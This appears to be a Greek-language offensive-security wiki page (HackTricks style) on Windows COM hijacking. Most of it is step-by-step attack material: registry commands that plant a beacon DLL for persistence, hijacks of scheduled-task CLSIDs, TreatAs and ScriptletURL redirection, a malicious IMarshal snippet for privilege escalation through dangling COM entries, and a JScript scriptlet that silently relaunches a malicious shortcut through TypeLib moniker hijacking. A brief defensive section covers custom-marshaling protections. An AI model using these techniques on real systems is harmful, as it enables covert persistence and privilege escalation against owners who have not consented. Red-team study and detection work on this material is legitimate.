# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζήτηση ανύπαρκτων COM components

Καθώς οι χρήστες μπορούν να τροποποιήσουν τις τιμές του HKCU, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως **μηχανισμός persistence**. Με το `procmon` είναι εύκολο να εντοπιστούν αναζητήσεις σε COM registries που δεν υπάρχουν ακόμη και θα μπορούσαν να δημιουργηθούν από έναν attacker. Κλασικά φίλτρα:

- Λειτουργίες **RegOpenKey**.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει σε **InprocServer32**.

Χρήσιμες παραλλαγές κατά το hunting:

- Αναζητήστε επίσης κλειδιά **`LocalServer32`** που λείπουν. Ορισμένες COM classes είναι out-of-process servers και θα εκκινήσουν ένα EXE ελεγχόμενο από attacker αντί για ένα DLL.
- Αναζητήστε λειτουργίες registry **`TreatAs`** και **`ScriptletURL`**, πέρα από το `InprocServer32`. Πρόσφατο περιεχόμενο detection και αναλύσεις malware τα επισημαίνουν συχνά, επειδή είναι πολύ πιο σπάνια από τις συνηθισμένες COM registrations και επομένως αποτελούν ισχυρά σήματα.
- Αντιγράψτε το νόμιμο **`ThreadingModel`** από το αρχικό `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` όταν κλωνοποιείτε μια registration στο HKCU. Η χρήση λάθος model συχνά διακόπτει το activation και κάνει το hijack πιο εμφανές.<sup>[[3]](#references)</sup>
- Σε συστήματα 64-bit, ελέγξτε τόσο την 64-bit όσο και την 32-bit προβολή (`procmon.exe` έναντι `procmon64.exe`, `HKLM\Software\Classes` και `HKLM\Software\Classes\WOW6432Node`), καθώς οι 32-bit εφαρμογές ενδέχεται να επιλύουν διαφορετική COM registration.

Αφού αποφασίσετε ποιο ανύπαρκτο COM θα υποδυθείτε, εκτελέστε τις ακόλουθες εντολές. _Προσέξτε αν αποφασίσετε να υποδυθείτε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολή._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### COM components του Task Scheduler που μπορούν να γίνουν hijack

Οι Εργασίες των Windows χρησιμοποιούν Custom Triggers για να καλούν αντικείμενα COM και, επειδή εκτελούνται μέσω του Task Scheduler, είναι ευκολότερο να προβλέψουμε πότε θα ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Εξετάζοντας την έξοδο, μπορείτε να επιλέξετε, για παράδειγμα, μία εργασία που θα εκτελείται **κάθε φορά που συνδέεται ένας χρήστης**.

Αναζητώντας τώρα το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στα **HKEY\CLASSES\ROOT\CLSID**, καθώς και στα HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Στη συνέχεια, μπορείς απλώς να δημιουργήσεις την εγγραφή HKCU και κάθε φορά που ο χρήστης συνδέεται, θα εκτελείται το backdoor σου.

## Ελλιπείς εγγραφές COM και Custom Marshaling

Μια εγγραφή COM σε επίπεδο μηχανήματος μπορεί να μετατραπεί σε primitive DLL planting χωρίς να αλλάξει το registry. Αναζήτησε μια τιμή `InprocServer32` της οποίας το DLL απουσιάζει και της οποίας η τελική διαδρομή μπορεί να δημιουργηθεί ή να τροποποιηθεί από χρήστη με χαμηλά προνόμια. Η τοποθέτηση ενός DLL με ακριβώς το ίδιο όνομα κάνει κάθε διεργασία που ενεργοποιεί το CLSID να φορτώσει κώδικα του επιτιθέμενου. Στο παράδειγμα CrossDevice, η καταχωρισμένη διαδρομή ήταν `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, οπότε ένας τυπικός χρήστης μπορούσε να δημιουργήσει τον φάκελο και το DLL που έλειπαν.<sup>[[5]](#references)</sup>

### Εγγράψιμοι χάρτες plugin ως διαδρομές ενεργοποίησης προνομιούχου COM

Ένας εγγράψιμος χάρτης plugin ID προς CLSID μπορεί να επιτρέψει σε έναν χρήστη με λιγότερα προνόμια να επιλέξει ποιος in-process COM server θα φορτωθεί από μια προνομιούχα υπηρεσία, ακόμη κι όταν δεν μπορεί να επεξεργαστεί την εγγραφή της κλάσης σε επίπεδο μηχανήματος.<sup>[[8]](#references)[[9]](#references)</sup> Στην αναφερθείσα περίπτωση `InstallService` των Windows 11, οι τυπικοί χρήστες μπορούσαν να τροποποιήσουν το `StaticPluginMap`· ένα μη ενσωματωμένο plugin ID επέλεγε ένα CLSID, το οποίο η υπηρεσία `LocalSystem` περνούσε στο `CoCreateInstance` με `CLSCTX_INPROC_SERVER` και `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> Το καταχωρισμένο DLL φορτώνεται στη διεργασία της υπηρεσίας και όχι σε ξεχωριστό COM host.<sup>[[10]](#references)</sup>

Οι σχετικές προϋποθέσεις είναι αποτελεσματική πρόσβαση εγγραφής στον χάρτη, ένα προσβάσιμο αίτημα plugin και μια διαδρομή DLL `InprocServer32` που μπορεί να ελέγξει ο χρήστης με λιγότερα προνόμια.<sup>[[8]](#references)[[9]](#references)</sup> Στην αναφερθείσα περίπτωση, η παραπάνω εγγραφή CrossDevice παρείχε την προϋπόθεση της διαδρομής.<sup>[[8]](#references)[[9]](#references)</sup> Ένα επιτυχές αντικείμενο plugin πρέπει να εκθέτει το ζητούμενο interface, αλλά το DLL φορτώνεται πριν ολοκληρωθεί το `CoCreateInstance`· η αποτυχία έκθεσης αυτού του interface δεν αποκλείει από μόνη της την εκτέλεση κώδικα κατά τη φόρτωση.<sup>[[8]](#references)[[11]](#references)</sup> Αυτή η διαδρομή μέσω dispatch της υπηρεσίας διαφέρει από τη διαδρομή custom-`IMarshal` παρακάτω. Για το ξεχωριστό primitive μέσω διαδρομής αρχείου, δες το [DLL Hijacking](dll-hijacking/).

### Το `IMarshal` ως primitive φόρτωσης DLL μεταξύ διεργασιών

Το COM αναπαριστά συνήθως έναν δείκτη interface με ένα τυπικό `OBJREF` που παραπέμπει τον παραλήπτη πίσω στο αρχικό αντικείμενο. Ένα αντικείμενο που υλοποιεί το `IMarshal` μπορεί αντί γι' αυτό να δημιουργήσει ένα custom `OBJREF`. Η μέθοδός του `GetUnmarshalClass` παρέχει το CLSID του κώδικα που θα ανασυνθέσει το αντικείμενο στη διεργασία-παραλήπτη. Αυτό το CLSID δεν χρειάζεται να ταυτοποιεί το αρχικό αντικείμενο. Το COM το επιλύει ως in-process server και φορτώνει το καταχωρισμένο DLL πριν από τη δρομολόγηση της ζητούμενης μεθόδου του interface.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Μια ελάχιστη κακόβουλη υλοποίηση χρειάζεται μόνο να αντικαταστήσει το ελλιπές CLSID στο `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Στείλτε αυτό το αντικείμενο μέσω μιας παραμέτρου μεθόδου μέσω proxy, όπως μια `[in] IUnknown *`. Μια άλλη επιλογή είναι η `CoGetInstanceFromIStorage`, με το αντικείμενο custom-marshaled να υλοποιεί επίσης αρκετά από το `IStorage`, ώστε να περνά τους τοπικούς ελέγχους. Το αυτόματο unmarshaling στον απομακρυσμένο server επιλύει το υποκατεστημένο CLSID, οπότε η φόρτωση του DLL γίνεται πριν εκτελεστεί η μέθοδος-στόχος.<sup>[[5]](#references)</sup>

Το primitive δεν περιορίζεται σε καταχωρίσεις που λείπουν. Μπορεί επίσης να αναγκάσει τον παραλήπτη να φορτώσει ένα υπάρχον DLL custom-unmarshaler και να εκθέσει σφάλματα στη διαδρομή φόρτωσης ή unmarshaling του.<sup>[[5]](#references)</sup>

Η αλυσίδα απαιτεί όλες τις παρακάτω προϋποθέσεις:<sup>[[5]](#references)</sup>

1. Ένα CLSID ορατό σε επίπεδο μηχανήματος παραπέμπει σε ένα ανύπαρκτο ή αντικαταστάσιμο in-process DLL.
2. Ο εισβολέας μπορεί να τοποθετήσει αυτό το DLL στη διαδρομή που επιλύεται.
3. Ένας ενεργοποιήσιμος out-of-process COM server εκτελείται με το επιθυμητό επίπεδο προνομίων.
4. Ο server αποδέχεται custom marshaling και εκθέτει μια κλήση μέσω proxy που μεταφέρει το αντικείμενο του εισβολέα πέρα από το όριο της διεργασίας.

### Εύρεση ορφανών in-process servers

Τα [OleViewDotNet](https://github.com/tyranid/oleviewdotnet) και [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) μπορούν να απαριθμήσουν τη βάση δεδομένων COM του μηχανήματος και να ελέγξουν κάθε server μέσω της κανονικής επίλυσης module των Win32. Αυτό προτιμάται από το `Test-Path`, επειδή ορισμένες καταχωρίσεις περιέχουν μόνο ένα όνομα αρχείου και βασίζονται στη διαδρομή αναζήτησης του loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Αντιμετωπίστε το αποτέλεσμα ως λίστα υποψηφίων και όχι ως απόδειξη εκμεταλλευσιμότητας. Επιλύστε τη διαδρομή όπως κάνει ο loader και, στη συνέχεια, εξετάστε το DACL του πρώτου γονικού καταλόγου που υπάρχει και του DLL-στόχου, αν υπάρχει ήδη. Ένα αρχείο που λείπει είναι χρήσιμο μόνο αν ο επιτιθέμενος μπορεί να δημιουργήσει ή να αντικαταστήσει τη διαδρομή που θα επιλύσει πράγματι το COM.<sup>[[5]](#references)</sup>

### Επιλογή και εκκίνηση προνομιούχου δέκτη

Εξετάστε τις υποψήφιες κλάσεις COM για τα `RunAs`, συσχέτιση με υπηρεσία, διαθέσιμα interfaces και RPC proxies. Μια κλάση ρυθμισμένη για `SYSTEM`, αλλά χωρίς αντίστοιχη υπηρεσία με όνομα, ενδέχεται να αποτύχει σε απευθείας ενεργοποίηση, επειδή το RPCSS δεν μπορεί να την εκκινήσει. Σε αυτή την περίπτωση, αναζητήστε ένα trigger χωρίς προνόμια που εκκινεί το host της, όπως μια εκτελέσιμη από χρήστη scheduled task, και αναπαραγάγετε τυχόν προϋπόθεση named-event ή IPC που διατηρεί τον server σε λειτουργία.<sup>[[5]](#references)</sup>

Για παράδειγμα, η ευάλωτη αλυσίδα Shell Create Object Handler εκκινούσε το host της δημιουργώντας το αναμενόμενο global event πριν καλέσει μια scheduled task εκτελέσιμη από χρήστη.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Αντιστοιχίστε την αναφορά του αντικειμένου που προέκυψε με τον host του και επαληθεύστε τόσο την ταυτότητα όσο και την πολιτική marshaling. Στη συνέχεια, απαριθμήστε τις διεπαφές και μετατρέψτε τους proxy τους σε IDL, για να εντοπίσετε μια παράμετρο εισόδου, όπως `IUnknown *`, η οποία θα κάνει marshal το πλαστό αντικείμενο.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Προστασίες custom-marshaling

Ένας κατάλληλος δέκτης δεν πρέπει να απορρίπτει μη έμπιστους custom marshalers. Δύο προστασίες σε επίπεδο διεργασίας είναι το `EOAC_NO_CUSTOM_MARSHAL` στις δυνατότητες που περνούν στο `CoInitializeSecurity` και το `COMGLB_UNMARSHALING_POLICY_STRONG`, το οποίο ορίζεται μέσω του `IGlobalOptions::Set`. Με σύμβολα, η αντίστοιχη κατάσταση μπορεί να ελεγχθεί στα `combase!gCapabilities` και `combase!g_GLBOPT_UnmarshalingPolicy`. Το NtObjectManager εμφανίζει το αποτέλεσμα ως `CustomMarshalAllowed` όταν ο parser διεργασιών του υποστηρίζει το συγκεκριμένο build των Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

Το `TreatAs` επιτρέπει την εξομοίωση ενός CLSID από ένα άλλο.<sup>[[4]](#references)</sup> Από επιθετική σκοπιά, αυτό σημαίνει ότι μπορείς να αφήσεις ανέπαφο το αρχικό CLSID, να δημιουργήσεις ένα δεύτερο CLSID ανά χρήστη που δείχνει στο `scrobj.dll` και, στη συνέχεια, να ανακατευθύνεις το πραγματικό αντικείμενο COM στο κακόβουλο μέσω του `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Αυτό είναι χρήσιμο όταν:

- η εφαρμογή-στόχος δημιουργεί ήδη ένα σταθερό CLSID κατά τη σύνδεση ή την εκκίνηση της εφαρμογής
- θέλεις ανακατεύθυνση μόνο μέσω του registry αντί να αντικαταστήσεις το αρχικό `InprocServer32`
- θέλεις να εκτελέσεις ένα τοπικό ή απομακρυσμένο scriptlet `.sct` μέσω της τιμής `ScriptletURL`

Παράδειγμα ροής εργασίας (προσαρμοσμένο από δημόσιες τεχνικές του Atomic Red Team και παλαιότερη έρευνα για κατάχρηση του COM registry):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Σημειώσεις:

- Το `scrobj.dll` διαβάζει την τιμή `ScriptletURL` και εκτελεί το αναφερόμενο `.sct`, επομένως μπορείτε να διατηρήσετε το payload ως τοπικό αρχείο ή να το ανακτήσετε απομακρυσμένα μέσω HTTP/HTTPS.
- Το `TreatAs` είναι ιδιαίτερα χρήσιμο όταν η αρχική εγγραφή COM είναι πλήρης και σταθερή στο HKLM, επειδή χρειάζεστε μόνο μια μικρή ανακατεύθυνση ανά χρήστη αντί να αντιγράψετε ολόκληρο το δέντρο.
- Για επικύρωση χωρίς να περιμένετε τη φυσική ενεργοποίηση, μπορείτε να δημιουργήσετε χειροκίνητα το ψεύτικο ProgID/CLSID με `rundll32.exe -sta <ProgID-or-CLSID>`, εφόσον η κλάση-στόχος υποστηρίζει ενεργοποίηση STA.

## COM TypeLib Hijacking (moniker persistence)

Οι βιβλιοθήκες τύπων (TypeLib) ορίζουν διεπαφές COM και φορτώνονται μέσω της `LoadTypeLib()`. Όταν δημιουργείται ένα στιγμιότυπο ενός COM server, το λειτουργικό σύστημα μπορεί επίσης να φορτώσει τη συσχετισμένη TypeLib, αναζητώντας τα κλειδιά μητρώου στο `HKCR\TypeLib\{LIBID}`. Αν η διαδρομή της TypeLib αντικατασταθεί με ένα **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet κατά την επίλυση της TypeLib, παρέχοντας έναν stealthy μηχανισμό persistence που ενεργοποιείται όταν χρησιμοποιούνται συνηθισμένα components.

Αυτό έχει παρατηρηθεί με το στοιχείο ελέγχου Microsoft Web Browser (που φορτώνεται συχνά από τον Internet Explorer, εφαρμογές που ενσωματώνουν το WebBrowser, ακόμη και από το `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Βήματα (PowerShell)

1) Εντοπίστε την TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID υψηλής συχνότητας. Παράδειγμα CLSID που συχνά γίνεται κατάχρηση από αλυσίδες malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Κατευθύνετε τη διαδρομή TypeLib ανά χρήστη σε ένα τοπικό scriptlet χρησιμοποιώντας το moniker `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Τοποθετήστε ένα ελάχιστο JScript `.sct` που επανεκκινεί το κύριο payload (π.χ. ένα `.lnk` που χρησιμοποιείται από την αρχική αλυσίδα):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Ενεργοποίηση – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control ή ακόμη και η συνήθης δραστηριότητα του Explorer θα φορτώσει το TypeLib και θα εκτελέσει το scriptlet, επανενεργοποιώντας την αλυσίδα σας κατά τη σύνδεση/επανεκκίνηση.

Εκκαθάριση
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Σημειώσεις
- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα COM στοιχεία υψηλής συχνότητας· να επιλύετε πάντα πρώτα το πραγματικό `LIBID` από το `HKCR\CLSID\{CLSID}\TypeLib`.
- Σε συστήματα 64-bit μπορείτε επίσης να συμπληρώσετε το δευτερεύον κλειδί `win64` για καταναλωτές 64-bit.

## References

- [1] [Παραβίαση του TypeLib – Νέα τεχνική persistence μέσω COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Εκστρατεία ZipLine: Μια εξελιγμένη επίθεση phishing με στόχο εταιρείες των ΗΠΑ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Επανεξέταση του COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Κλειδί CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Τεχνικές εκμετάλλευσης των Windows: Αιωρούμενες καταχωρίσεις αντικειμένων COM](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Διασύνδεση IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC και τεχνική ανάλυση (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Τοπική κλιμάκωση προνομίων μέσω της υπηρεσίας εγκατάστασης των Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Απαρίθμηση CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Συνάρτηση CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

